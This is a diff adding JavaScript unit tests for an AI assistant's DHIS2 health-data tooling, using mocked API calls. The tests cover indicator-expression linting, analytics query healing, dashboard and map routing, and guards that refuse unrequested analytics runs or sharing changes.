+    truthy('…with totalPages and a plain orgUnit they pass', !/pageCount|plain UID/.test(trackerLint(pagedBad.replace('page: 1,', 'page: 1, totalPages: true,').replace('orgUnit[id,displayName]', 'orgUnit'))));
+    const selLint = (src) => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, 'app', null).errors.some((e) => /has no "items" prop/.test(e.message));
+    eq('custom-app lint: <SingleSelectField items={…}> (an empty dropdown) is refused; options as children pass', [selLint('const A = () => <SingleSelectField label="F" items={xs} selected={v} onChange={f} />;'), selLint('const A = () => <SingleSelectField label="F" selected={v} onChange={f}>{xs.map((x) => <SingleSelectOption key={x} value={x} label={x} />)}</SingleSelectField>;')], [true, false]);
+    eq('custom-app lint: a tracker timestamp with T00:00:00 appended (Invalid Date) is refused; a trimmed one or a DATE data value is not', [lintDates(bug), lintDates(bug.replace("latest.occurredAt", "String(latest.occurredAt).slice(0, 10)")), lintDates("const next = new Date(dv.value + 'T00:00:00');")], [true, false, false]);
+  }
+  {
+    const h = ctx.healArgumentEntities({ program_short_name: 'NCD HTN &amp; DM Care', name: 'Visits (A &amp; B)', rules: [{ condition: '#{a} &lt; 140 &amp;&amp; #{b} &gt;= 90' }], files: { 'plugin.jsx': '<span>BP &lt; 140</span>' }, html: '<p>Q&amp;A</p>', path: 'a?x=1&amp;y=2' });
+    eq('HTML entities a model put in names / expressions are decoded; code, HTML and paths are left alone', [h.value.program_short_name, h.value.name, h.value.rules[0].condition, h.value.files['plugin.jsx'], h.value.html, h.value.path], ['NCD HTN & DM Care', 'Visits (A & B)', '#{a} < 140 && #{b} >= 90', '<span>BP &lt; 140</span>', '<p>Q&amp;A</p>', 'a?x=1&amp;y=2']);
+  }
+  {
+    const saved8 = ctx.safeDhis2Fetch; const seen = [];
+    const d8 = ctx.__dhis2(); const savedOu = d8.ouContext; const savedPc = d8.pageContext;
+    d8.ouContext = null; d8.pageContext = { appType: 'Dashboard' };
+    ctx.safeDhis2Fetch = async (p) => { seen.push(p); return { headers: [{ name: 'ou' }, { name: 'value' }], rows: [['rootA', '30'], ['rootB', '10']] }; };
+    try {
+      const r = await ctx.executeTool('count_records', { record_type: 'enrollments', program_override: 'progNcd0001' });
+      eq('count_records with no org unit anywhere counts across USER_ORGUNIT (sum of the top units) instead of failing', [r._error || r.count, /dimension=ou:USER_ORGUNIT&/.test(seen[0] || '')], [40, true]);
+    } finally { ctx.safeDhis2Fetch = saved8; d8.ouContext = savedOu; d8.pageContext = savedPc; }
+  }
+  {
+    const saved9 = ctx.safeDhis2Fetch; const d9 = ctx.__dhis2(); const savedWa = d9.writeAuth; const posts = [];
+    d9.writeAuth = { scope: 'broad', reason: 'verify' };
+    ctx.safeDhis2Fetch = async (p, o = {}) => {
+      if (o.method === 'POST') { posts.push(p); return { response: { id: 'job1' } }; }
+      if (p === 'system/info') return { lastAnalyticsTableSuccess: '2026-10-28T21:00:08.103' };
+      if (p.startsWith('programs?order=created:desc')) return { programs: [{ id: 'progNcd0001', displayName: 'NCD', created: '2026-10-28T20:50:00.000' }] };
+      return { _error: 'unexpected ' + p };
+    };
+    try {
+      vm.runInContext('lastUserText = "add the pie chart to the dashboard"; conversationHistory = [];', ctx);
+      const r = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'resourceTables/analytics' });
+      truthy('an analytics run the user did not ask for is refused when the tables are newer than every program (nothing started)', r._scope === 'analytics_run_not_requested' && posts.length === 0);
+    } finally { ctx.safeDhis2Fetch = saved9; d9.writeAuth = savedWa; vm.runInContext('lastUserText = ""; conversationHistory = [];', ctx); }
+  }
+  {
+    const saved10 = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p) => (p.startsWith('visualizations/vizCtx00001') ? { dataDimensionItems: [{ programIndicator: { id: 'piRate00001' } }], relativePeriods: { last12Months: true }, userOrganisationUnit: true, columns: [{ dimension: 'dx', items: [{ id: 'piRate00001' }] }], rows: [{ dimension: 'pe', items: [{ id: 'LAST_12_MONTHS' }] }], filters: [{ dimension: 'ou', items: [{ id: 'USER_ORGUNIT' }] }] } : { _error: 'x' });
+    try {
+      const out = await ctx.enrichAnalyticsPathWithVisualizationContext('analytics?dimension=dx:piRate00001&dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT', 'vizCtx00001');
+      truthy('visualization-context enrichment never re-adds a dimension the query already has as a FILTER (409)', !/dimension=ou/.test(decodeURIComponent(out)));
+    } finally { ctx.safeDhis2Fetch = saved10; }
+  }
+  {
+    const saved11 = ctx.safeDhis2Fetch; let called = 0;
+    ctx.safeDhis2Fetch = async () => { called++; return {}; };
+    try {
+      const r = await ctx.executeTool('dhis2_query', { path: 'dhis-web-capture/index.html' });
+      truthy('dhis2_query refuses a web-app page (no 404 call) and explains the Capture deep link', /web-app page/.test(r._error || '') && /enrollment\?enrollmentId=/.test(r._hint || '') && called === 0);
+    } finally { ctx.safeDhis2Fetch = saved11; }
+    {
+      const dS = ctx.__dhis2(); const savedS = { wa: dS.writeAuth, n: dS.consecutiveDiscoveryCalls };
+      dS.writeAuth = { scope: 'broad' }; dS.consecutiveDiscoveryCalls = 20;
+      truthy('the discovery-streak guard never blocks manage_custom_app preview (its own hint sends the model there), but still blocks a list', ctx.discoveryStreakStopOrNull('manage_custom_app', { action: 'preview' }) === null && !!ctx.discoveryStreakStopOrNull('manage_custom_app', { action: 'list' }));
+      dS.writeAuth = savedS.wa; dS.consecutiveDiscoveryCalls = savedS.n;
+    }
+  }
+  const kb = vm.runInContext('KB_PROGRAM_RULE_SYNTAX + KB_METADATA_SHARING', ctx);
+  truthy('manuals: one unscoped rule covers every stage; TrackedEntityType is data-shareable', /One rule covers every stage/.test(kb) && /Only Program, ProgramStage and TrackedEntityType are DATA-shareable/.test(kb));
+}
+
+
+// The 2026-10-29 MNCH dashboard thread: a "continue" turn without the
+// dashboard/map tools, program indicators that save but break analytics,
+// a line list asked to do a pivot table's job, raw chart/map POSTs.
+async function runDashboardThreadChecks() {
+  console.log('\nMNCH dashboard thread (routing, indicator runtime traps, line-list limits, raw analytics writes):');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const d = ctx.__dhis2();
+  const savedApi = d.apiVersion;
+
+  // Routing: "continue" carries the request it continues.
+  const ask = 'Please create a dashboard for this program, it should have different maps, visualizations and tables, first create a line listing table that has all the OUs, then a visualization, lastly create a map with a point on each OU sized by the percentage.';
+  vm.runInContext(`conversationHistory = ${JSON.stringify([{ role: 'user', content: ask }, { role: 'assistant', content: 'Say continue and I will finish.' }])};`, ctx);
+  const routing = ctx.buildRoutingText('continue');
+  const names = ctx.getContextualTools({}, routing, false, 'continue').map((t) => t.function.name);
+  truthy('a "continue" turn is routed with the request it continues (dashboards, maps, line lists offered)', routing.includes('line listing table') && ['manage_dashboards', 'manage_maps', 'manage_line_lists'].every((n) => names.includes(n)));
+  truthy('…a long new request is routed on itself only', ctx.buildRoutingText('x '.repeat(40)).trim() === 'x '.repeat(40).trim());
+  vm.runInContext(`conversationHistory = ${JSON.stringify([{ role: 'user', content: ask }, { role: 'user', content: 'continue' }])};`, ctx);
+  truthy('…bare follow-ups are skipped when looking for the request', ctx.buildRoutingText('yes go ahead').includes('line listing table'));
+  vm.runInContext('conversationHistory = [];', ctx);
+
+  // Program-indicator analytics-runtime traps (verified live 2.42.5 + 2.43.2).
+  const stageById = new Map([
+    ['eaDHS084uMp', { displayName: 'ANC 1st visit', programStageDataElements: [{ dataElement: { id: 'UXz7xuGCEhU', displayName: 'Weight', valueType: 'NUMBER' } }] }],
+    ['grIfo3oOf4Y', { displayName: 'ANC Visit (2-4+)', programStageDataElements: [{ dataElement: { id: 'g9eOBujte1U', displayName: 'ANC Visit', valueType: 'TEXT' } }] }],
+  ]);
+  const trap = (pi, v = 43) => ctx.piAnalyticsRuntimeTraps({ name: 'x', filter: '', ...pi }, stageById, v);
+  const healed = { expression: 'V{tei_count}', analyticsType: 'ENROLLMENT', aggregationType: 'SUM' };
+  const r1 = ctx.piAnalyticsRuntimeTraps(healed, stageById, 43);
+  truthy('V{tei_count} + SUM (SQL 42883) is healed to COUNT and reported', !r1.error && healed.aggregationType === 'COUNT' && r1.corrections.length === 1);
+  truthy('…aggregation NONE (HTTP 500 / SQL 42601 in every analytics query) is refused, except a bare count variable which heals to COUNT', !!trap({ expression: 'd2:count(#{eaDHS084uMp.UXz7xuGCEhU})', analyticsType: 'ENROLLMENT', aggregationType: 'NONE' }).error && (() => { const pi = { name: 'x', filter: '', expression: 'V{enrollment_count}', analyticsType: 'ENROLLMENT', aggregationType: 'NONE' }; const r = ctx.piAnalyticsRuntimeTraps(pi, stageById, 43); return !r.error && pi.aggregationType === 'COUNT'; })());
+  truthy('…V{enrollment_count} inside arithmetic with SUM is refused', !!trap({ expression: 'V{enrollment_count} * 100', analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }).error);
+  truthy('…V{event_count} in an ENROLLMENT indicator (42703) is refused', /42703/.test(trap({ expression: 'V{event_count}', analyticsType: 'ENROLLMENT', aggregationType: 'COUNT' }).error || ''));
+  truthy('…d2:countIfValue on a TEXT data element is refused on 2.43, allowed on 2.42', !!trap({ expression: "d2:countIfValue(#{grIfo3oOf4Y.g9eOBujte1U}, '2')", analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }).error && !trap({ expression: "d2:countIfValue(#{grIfo3oOf4Y.g9eOBujte1U}, '2')", analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }, 42).error);
+  truthy('…d2:countIfCondition on a TEXT data element is refused on every version', !!trap({ expression: "d2:countIfCondition(#{grIfo3oOf4Y.g9eOBujte1U}, \"== '2'\")", analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }, 42).error);
+  truthy('…numeric countIfValue and V{event_count} SUM in an EVENT indicator pass', !trap({ expression: 'd2:countIfValue(#{eaDHS084uMp.UXz7xuGCEhU}, 3000)', analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }).error && !trap({ expression: 'V{event_count}', analyticsType: 'EVENT', aggregationType: 'SUM', filter: "V{program_stage_id} == 'eaDHS084uMp'" }).error);
+  truthy('…an EVENT count named after one stage but counting every stage is refused with the stage filter', /V\{program_stage_id\} == 'grIfo3oOf4Y'/.test(trap({ name: 'ANC 2-4+ visit count', expression: 'V{event_count}', analyticsType: 'EVENT', aggregationType: 'COUNT' }).hint || ''));
+  truthy('…an unscoped EVENT count with a generic name only gets an advisory', (() => { const r = trap({ name: 'All visits', expression: 'V{event_count}', analyticsType: 'EVENT', aggregationType: 'COUNT' }); return !r.error && r.advisories.length === 1; })());
+
+  {
+    const saved = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p) => (p.startsWith('programs/') ? { programStages: [...stageById.entries()].map(([id, st]) => ({ id, ...st })) } : { _error: 'x' });
+    try {
+      const pis = [
+        { id: 'w3OTpzL30uY', name: 'ANC 1st visit count', expression: 'V{event_count}', filter: '', analyticsType: 'EVENT', aggregationType: 'COUNT' },
+        { id: 'fgjdNH53Rh6', name: 'ANC 1st visit coverage (%)', expression: 'd2:condition("d2:hasValue(#{eaDHS084uMp.UXz7xuGCEhU})", 100, 0)', filter: '', analyticsType: 'ENROLLMENT', aggregationType: 'AVERAGE' },
+      ];
+      const n = await ctx.annotateProgramIndicatorProblems(pis, 'uy2gU8kT1jF');
+      truthy('list/get flag an EXISTING indicator that counts every stage (so it is not reused blindly); a sound one is untouched', n === 1 && /ALL 2 stages/.test(pis[0]._problem || '') && !pis[1]._problem);
+    } finally { ctx.safeDhis2Fetch = saved; }
+  }
+
+  // d2:hasValue inside d2:condition is valid (server-verified); bare is not.
+  truthy('PI lint: d2:hasValue inside d2:condition passes, a bare top-level d2:hasValue is still refused',
+    ctx.lintProgramIndicatorExpression('d2:condition("d2:hasValue(#{eaDHS084uMp.UXz7xuGCEhU})", 100, 0)', 'expression') === null
+    && !!ctx.lintProgramIndicatorExpression('d2:hasValue(#{eaDHS084uMp.UXz7xuGCEhU})', 'expression'));
+
+  // Runtime proof after save: the broken one of two is isolated.
+  {
+    const saved = ctx.safeDhis2Fetch; const calls = [];
+    ctx.safeDhis2Fetch = async (p) => {
+      calls.push(p);
+      if (p === 'system/info') return { lastAnalyticsTableSuccess: '2026-10-29T01:00:00.000' };
+      if (p.startsWith('programs/progRt00001')) return { id: 'progRt00001', created: '2020-01-01T00:00:00.000' };
+      if (p.startsWith('analytics?')) {
+        const dx = decodeURIComponent(p).match(/dx:([^&]+)/)[1].split(';');
+        if (dx.includes('piBroken001')) return { _error: 'DHIS2 API 409: Query failed because of a syntax error (SqlState: 42883)', _status: 409 };
+        return { rows: dx.map((id) => [id, '1.0']) };
+      }
+      return { _error: 'unexpected ' + p };
+    };
+    try {
+      const rc = await ctx.piRuntimeAnalyticsCheck('progRt00001', ['piGood00001', 'piBroken001']);
+      truthy('post-save analytics check isolates the indicator that cannot be computed', rc && rc.ok === false && rc.broken.length === 1 && rc.broken[0].id === 'piBroken001' && rc.with_data.includes('piGood00001'));
+    } finally { ctx.safeDhis2Fetch = saved; }
+  }
+  {
+    const saved = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p) => {
+      if (p === 'system/info') return { lastAnalyticsTableSuccess: '2026-10-29T01:00:00.000' };
+      if (p.startsWith('programs/progRt00002')) return { id: 'progRt00002', created: '2020-01-01T00:00:00.000' };
+      return { _error: 'DHIS2 API 409: Query failed because a referenced table does not exist (E7144)', _status: 409 };
+    };
+    try {
+      const rc = await ctx.piRuntimeAnalyticsCheck('progRt00002', ['piGood00001']);
+      truthy('…a missing analytics table is not blamed on the indicator', rc && rc.ok === true && rc.skipped && rc.skipped.length === 1);
+    } finally { ctx.safeDhis2Fetch = saved; }
+  }
+
+  // Line lists: what a column can show per row.
+  const llCtx = {
+    stages: [{ id: 'grIfo3oOf4Y', name: 'ANC Visit (2-4+)', deIds: ['g9eOBujte1U'] }],
+    des: new Map([['g9eOBujte1U', { id: 'g9eOBujte1U', name: 'ANC Visit', valueType: 'TEXT' }]]),
+  };
+  const rowProblem = (pi) => ctx.lineListPiRowLevelProblem({ id: 'piX0000000a', name: 'p', filter: '', analyticsType: 'ENROLLMENT', ...pi }, llCtx, 'ENROLLMENT');
+  const pct = rowProblem({ expression: 'd2:condition("d2:hasValue(#{grIfo3oOf4Y.g9eOBujte1U})", 100, 0)', aggregationType: 'AVERAGE' });
+  truthy('line list: a percentage indicator column is refused with the pivot-table alternative', pct && /PERCENTAGE/.test(pct._error) && /PIVOT_TABLE/.test(pct._hint) && pct.overridable === true);
+  truthy('…a count-of-records column (1 on every row) is refused, not overridable', (() => { const r = rowProblem({ expression: 'V{enrollment_count}', aggregationType: 'COUNT' }); return r && /1 on every row/.test(r._error) && !r.overridable; })());
+  d.apiVersion = '43';
+  truthy('…an analytics-runtime trap is refused with its real cause before any probe (2.43)', /countIfValue/.test((rowProblem({ expression: "d2:countIfValue(#{grIfo3oOf4Y.g9eOBujte1U}, '2')", aggregationType: 'SUM' }) || {})._error || ''));
+  truthy('…a per-record count (d2:count, SUM) is fine', rowProblem({ expression: 'd2:count(#{grIfo3oOf4Y.g9eOBujte1U})', aggregationType: 'SUM' }) === null);
+  {
+    const ouCtx = { program: { name: 'P' }, stagesById: new Map(), teas: new Map(), des: new Map(), pis: new Map(), teaByName: new Map(), deByName: new Map(), piByName: new Map() };
+    const saved = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p) => (p.startsWith('organisationUnits?') ? { organisationUnits: [{ id: 'ImspTQPwCqd' }] } : { _error: 'x' });
+    try {
+      const joined = await ctx.lineListResolveDimension({ dimension: 'ou', org_units: ['LEVEL-4;ImspTQPwCqd'] }, ouCtx, 'ENROLLMENT', new Map(), 'column');
+      const lvl = await ctx.lineListResolveDimension({ dimension: 'ou', org_unit_level: 4 }, ouCtx, 'ENROLLMENT', new Map(), 'column');
+      truthy('…org units sent as "LEVEL-4;<uid>" or as org_unit_level are healed, not refused', joined.kind === 'ou' && joined.items.join(',') === 'LEVEL-4,ImspTQPwCqd' && lvl.kind === 'ou' && lvl.items[0] === 'LEVEL-4');
+    } finally { ctx.safeDhis2Fetch = saved; }
+  }
+
+  // dhis2_query: hand-built charts / maps / line lists / dashboards are refused.
+  {
+    const saved = ctx.safeDhis2Fetch; const savedWa = d.writeAuth; let sent = 0;
+    d.writeAuth = { scope: 'broad', reason: 'verify' };
+    ctx.safeDhis2Fetch = async () => { sent++; return { status: 'OK' }; };
+    try {
+      const viz = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'visualizations', body: { name: 'x', type: 'LINE', columns: [{ dimension: 'ou', items: [{ id: 'ImspTQPwCqd' }] }] } });
+      const map = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'maps', body: { name: 'x', mapViews: [] } });
+      const mv = await ctx.executeTool('dhis2_query', { method: 'PATCH', path: 'mapViews/JHamZu0r4rx', body: { thematicMapType: 'BUBBLE' } });
+      const dash = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'dashboards', body: { name: 'x', dashboardItems: [] } });
+      const meta = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'metadata', body: { maps: [{ name: 'x' }] } });
+      truthy('dhis2_query refuses hand-built visualizations / maps / map layers / dashboards / metadata bundles and names the tool (nothing sent)',
+        sent === 0 && viz._redirect === 'manage_dashboards' && map._redirect === 'manage_maps' && mv._redirect === 'manage_maps' && dash._redirect === 'manage_dashboards' && meta._redirect === 'manage_maps');
+      sent = 0;
+      const rename = await ctx.executeTool('dhis2_query', { method: 'PATCH', path: 'visualizations/p3QxBYDESIE', body: { name: 'Renamed' } });
+      truthy('…a rename-only PATCH still goes through', !rename._redirect && sent > 0);
+    } finally { ctx.safeDhis2Fetch = saved; d.writeAuth = savedWa; }
+  }
+
+  // LAST_N_YEARS excludes the current year: a chart that misses all its data says so.
+  {
+    const saved = ctx.safeDhis2Fetch; let calls = 0;
+    ctx.safeDhis2Fetch = async (p) => { calls++; return /pe:THIS_YEAR/.test(decodeURIComponent(p)) ? { rows: [['piA0000000a', '100.0']] } : { rows: [['piA0000000a', '0.0']] }; };
+    try {
+      const w = await ctx.periodsMissThisYearWarning(['piA0000000a'], ['LAST_5_YEARS']);
+      const callsAfterFirst = calls;
+      const none = await ctx.periodsMissThisYearWarning(['piA0000000a'], ['LAST_12_MONTHS']);
+      const withThis = await ctx.periodsMissThisYearWarning(['piA0000000a'], ['THIS_YEAR', 'LAST_5_YEARS']);
+      truthy('a chart on LAST_5_YEARS whose data is all in the current year gets a warning; LAST_12_MONTHS / THIS_YEAR+LAST_5_YEARS cost no call', /COMPLETED/.test(w || '') && /THIS_YEAR/.test(w || '') && none === null && withThis === null && calls === callsAfterFirst);
+    } finally { ctx.safeDhis2Fetch = saved; }
+  }
+
+  truthy('an event analytics query mixing two stages is refused before it is sent (409 E7244); one stage or enrollment analytics passes',
+    !!ctx.eventAnalyticsMultiStageRefusal('analytics/events/aggregate/uy2gU8kT1jF?dimension=ou%3AImspTQPwCqd&dimension=eaDHS084uMp.UXz7xuGCEhU&dimension=grIfo3oOf4Y.g9eOBujte1U&stage=eaDHS084uMp')
+    && ctx.eventAnalyticsMultiStageRefusal('analytics/events/aggregate/uy2gU8kT1jF?dimension=ou%3AImspTQPwCqd&dimension=eaDHS084uMp.UXz7xuGCEhU&stage=eaDHS084uMp') === null
+    && ctx.eventAnalyticsMultiStageRefusal('analytics/enrollments/aggregate/uy2gU8kT1jF?dimension=eaDHS084uMp.UXz7xuGCEhU&dimension=grIfo3oOf4Y.g9eOBujte1U') === null
+    && !!ctx.eventAnalyticsMultiStageRefusal('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou%3AImspTQPwCqd&dimension=stage%3AWZbXY0S00lP%3BedqlbukwRfQ%3BPFDfvmGpsR3'));
+  {
+    const saved = ctx.safeDhis2Fetch; const savedWa = d.writeAuth; let sent = 0;
+    d.writeAuth = { scope: 'broad', reason: 'verify' };
+    ctx.safeDhis2Fetch = async () => { sent++; return { object: { publicAccess: 'rw------', userGroupAccesses: [], userAccesses: [] } }; };
+    try {
+      vm.runInContext(`conversationHistory = []; lastUserText = ${JSON.stringify(ask)};`, ctx);
+      const r = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', public_access: 'rwr-----' });
+      truthy('sharing a dashboard the user never asked to share is refused (nothing sent)', r._scope === 'sharing_not_requested' && sent === 0);
+      vm.runInContext('lastUserText = "build the dashboard and make it public for everyone";', ctx);
+      const r2 = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', public_access: 'r-------' });
+      truthy('…and allowed when the user asked for it', r2._scope !== 'sharing_not_requested' && sent > 0);
+    } finally { ctx.safeDhis2Fetch = saved; d.writeAuth = savedWa; vm.runInContext('lastUserText = ""; conversationHistory = [];', ctx); }
+  }
+
+  // RMNCH dashboard run (2026-10-29): Yes/No comparisons, events in the period,
+  // swallowed failures in multi-indicator queries, no program PATCH.
+  {
+    const boolStages = new Map([['PFDfvmGpsR3', { displayName: 'Care at birth', programStageDataElements: [
+      { dataElement: { id: 'FIHEeJwfhZH', displayName: 'Maternal near-miss', valueType: 'BOOLEAN' } },
+      { dataElement: { id: 'vANAXwtLwcT', displayName: 'Hemoglobin value', valueType: 'NUMBER' } },
+    ] }]]);
+    const yes = { name: 'Near-miss Yes', expression: 'd2:condition("#{PFDfvmGpsR3.FIHEeJwfhZH} == true", 1, 0)', filter: "V{program_stage_id} == 'PFDfvmGpsR3' && #{PFDfvmGpsR3.FIHEeJwfhZH} != 'false'", analyticsType: 'EVENT', aggregationType: 'SUM' };
+    const r = ctx.piAnalyticsRuntimeTraps(yes, boolStages, 43);
+    truthy('a Yes/No data element compared with true / \'false\' (SQL 42883 / E7132) is healed to 1 / 0 in expression and filter, and reported',
+      !r.error && yes.expression === 'd2:condition("#{PFDfvmGpsR3.FIHEeJwfhZH} == 1", 1, 0)' && /FIHEeJwfhZH\} != 0$/.test(yes.filter) && r.corrections.length === 2);
+    const un = { name: 'Not answered', expression: 'V{event_count}', filter: "V{program_stage_id} == 'PFDfvmGpsR3' && #{PFDfvmGpsR3.FIHEeJwfhZH} == ''", analyticsType: 'EVENT', aggregationType: 'COUNT' };
+    const ru = ctx.piAnalyticsRuntimeTraps(un, boolStages, 43);
+    truthy('"missing" written as == \'\' (E7132 on number / Yes-No, always 0 on text) is healed to !d2:hasValue(…)', !ru.error && /&& !d2:hasValue\(#\{PFDfvmGpsR3\.FIHEeJwfhZH\}\)$/.test(un.filter));
+    const num = { name: 'x', expression: 'd2:condition("#{PFDfvmGpsR3.vANAXwtLwcT} == 1", 1, 0)', filter: '', analyticsType: 'EVENT', aggregationType: 'SUM' };
+    truthy('…a numeric data element is left alone', ctx.piAnalyticsRuntimeTraps(num, boolStages, 43).corrections.length === 0);
+  }
+  {
+    const saved = { sdf: ctx.safeDhis2Fetch, val: ctx.validateProgramIndicatorExpressionResilient };
+    ctx.safeDhis2Fetch = async (p) => (p.startsWith('categoryCombos') ? { categoryCombos: [{ id: 'bjDvmb4bfuf' }] }
+      : { programStages: [{ id: 'edqlbukwRfQ', displayName: 'Second antenatal care visit', programStageDataElements: [{ dataElement: { id: 'vANAXwtLwcT', displayName: 'Hemoglobin value', valueType: 'NUMBER' } }] }] });
+    ctx.validateProgramIndicatorExpressionResilient = async () => ({ status: 'OK' });
+    try {
+      const a = await ctx._prepareProgramIndicatorObject('WSGAb5XwJ3Y', null, { name: 'x', analytics_type: 'ENROLLMENT', aggregation_type: 'COUNT', expression: 'V{enrollment_count}', filter: "d2:countIfCondition(#{edqlbukwRfQ.vANAXwtLwcT}, '< 11') > 0", events_in_period: true });
+      const b = await ctx._prepareProgramIndicatorObject('WSGAb5XwJ3Y', null, { name: 'y', analytics_type: 'ENROLLMENT', aggregation_type: 'COUNT', expression: 'V{enrollment_count}' });
+      const t = (pi) => (pi?.analyticsPeriodBoundaries || []).map((x) => x.boundaryTarget).sort().join(',');
+      truthy('events_in_period adds EVENT_DATE boundaries to an enrollment indicator (202, not 909); without it only ENROLLMENT_DATE', t(a.pi) === 'ENROLLMENT_DATE,ENROLLMENT_DATE,EVENT_DATE,EVENT_DATE' && t(b.pi) === 'ENROLLMENT_DATE,ENROLLMENT_DATE');
+    } finally { ctx.safeDhis2Fetch = saved.sdf; ctx.validateProgramIndicatorExpressionResilient = saved.val; }
+  }
+  {
+    const saved = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p) => {
+      if (p === 'system/info') return { lastAnalyticsTableSuccess: '2026-10-29T01:00:00.000' };
+      if (p.startsWith('programs/progRt00003')) return { id: 'progRt00003', created: '2020-01-01T00:00:00.000' };
+      const dx = decodeURIComponent(p).match(/dx:([^&]+)/)[1].split(';');
+      if (dx.length === 1 && dx[0] === 'piSwallow01') return { _error: 'DHIS2 API 409: Query failed because of a syntax error (SqlState: 42883)', _status: 409 };
+      return { rows: dx.filter((id) => id !== 'piSwallow01').map((id) => [id, '5.0']) };
+    };
+    try {
+      const rc = await ctx.piRuntimeAnalyticsCheck('progRt00003', ['piGood00002', 'piSwallow01']);
+      truthy('an indicator a multi-item query silently leaves out is re-asked alone and caught', rc.ok === false && rc.broken.length === 1 && rc.broken[0].id === 'piSwallow01');
+    } finally { ctx.safeDhis2Fetch = saved; }
+  }
+  {
+    vm.runInContext('_captureMetaPending = null;', ctx);
+    ctx.noteCaptureMetadataWrite('POST', 'metadata', JSON.stringify({ programIndicators: [{ id: 'piA0000000b', program: { id: 'WSGAb5XwJ3Y' }, displayInForm: false }] }), []);
+    const none = ctx.captureMetaPending().programs.size === 0;
+    ctx.noteCaptureMetadataWrite('POST', 'metadata', JSON.stringify({ programIndicators: [{ id: 'piA0000000c', program: { id: 'WSGAb5XwJ3Y' }, displayInForm: true }] }), []);
+    const one = ctx.captureMetaPending().programs.has('WSGAb5XwJ3Y');
+    vm.runInContext('_captureMetaPending = null;', ctx);
+    truthy('analytics-only indicators do not bump the program version (no program PATCH); a displayInForm one still does', none && one);
+  }
+
+  {
+    const h = ctx.healAnalyticsPeriodAndDates('analytics?dimension=dx%3AaTzpJgBMnGk&dimension=ou%3AImspTQPwCqd&dimension=pe%3A2026&startDate=2026-01-01&endDate=2026-12-31');
+    const keep = ctx.healAnalyticsPeriodAndDates('analytics?dimension=dx%3AaTzpJgBMnGk&dimension=ou%3AImspTQPwCqd&startDate=2026-01-01&endDate=2026-12-31');
+    truthy('/analytics with a period AND start/end dates (409 E7105) drops the dates; dates alone are kept', h.healed && !/startDate|endDate/.test(h.path) && /pe%3A2026/.test(h.path) && !keep.healed);
+  }
+  {
+    const typeMap = { piA0000000d: 'PROGRAM_INDICATOR', piA0000000e: 'PROGRAM_INDICATOR' };
+    const swapped = ctx.buildVisualizationObject({ name: 'Avg Hb by month', vis_type: 'LINE', data_items: ['piA0000000d', 'piA0000000e'], periods: ['202601', '202602'], org_units: ['ImspTQPwCqd'], layout: { columns: ['pe'], rows: ['dx'], filters: ['ou'] } }, typeMap);
+    const named = ctx.buildVisualizationObject({ name: 'Near-miss by district', vis_type: 'STACKED_BAR', data_items: ['piA0000000d', 'piA0000000e'], periods: ['2026'], org_units: ['ImspTQPwCqd', 'LEVEL-2'], layout: { category: ['ou'], series: ['dx'], filters: ['pe'] } }, typeMap);
+    const pivot = ctx.buildVisualizationObject({ name: 'Table', vis_type: 'PIVOT_TABLE', data_items: ['piA0000000d'], periods: ['2026'], org_units: ['ImspTQPwCqd', 'LEVEL-2'], layout: { rows: ['ou'], columns: ['dx'], filters: ['pe'] } }, typeMap);
+    truthy('chart layout: data items alone on the x-axis (columns:[pe], rows:[dx]) is swapped back with a note; category/series names map to rows/columns; pivots untouched',
+      swapped.viz.rowDimensions.join() === 'pe' && swapped.viz.columnDimensions.join() === 'dx' && /Layout corrected/.test(swapped.layoutNote || '')
+      && named.viz.rowDimensions.join() === 'ou' && named.viz.columnDimensions.join() === 'dx' && !named.layoutNote
+      && pivot.viz.rowDimensions.join() === 'ou' && !pivot.layoutNote);
+  }
+
+  {
+    const saved = ctx.safeDhis2Fetch; const seen = [];
+    ctx.safeDhis2Fetch = async (p) => { seen.push(p); if (p.startsWith('programStages/')) return { program: { id: 'WSGAb5XwJ3Y' } }; return { _error: 'stop here', _status: 400 }; };
+    const dd = ctx.__dhis2(); const savedPc = dd.pageContext; dd.pageContext = { appType: 'Dashboard' };
+    try {
+      const r = await ctx.executeTool('count_records', { record_type: 'events', stage_id: 'edqlbukwRfQ', ou_override: 'ImspTQPwCqd' });
+      truthy('count_records with only a stage_id (no program page) finds the stage\'s program instead of "no program in context"', !/No program in context/.test(r?._error || '') && seen.some((p) => p.startsWith('programStages/edqlbukwRfQ')));
+    } finally { ctx.safeDhis2Fetch = saved; dd.pageContext = savedPc; }
+  }
+
+  {
+    const saved = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p) => (p.startsWith('programs/WSGAb5XwJ3Y') ? { programStages: [{ id: 'WZbXY0S00lP' }, { id: 'edqlbukwRfQ' }] } : { _error: 'x' });
+    try {
+      const ev = await ctx.healBareStageDimension('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou%3AImspTQPwCqd&dimension=pe%3A2026&dimension=WZbXY0S00lP');
+      const en = await ctx.healBareStageDimension('analytics/enrollments/aggregate/WSGAb5XwJ3Y?dimension=ou%3AImspTQPwCqd&dimension=WZbXY0S00lP');
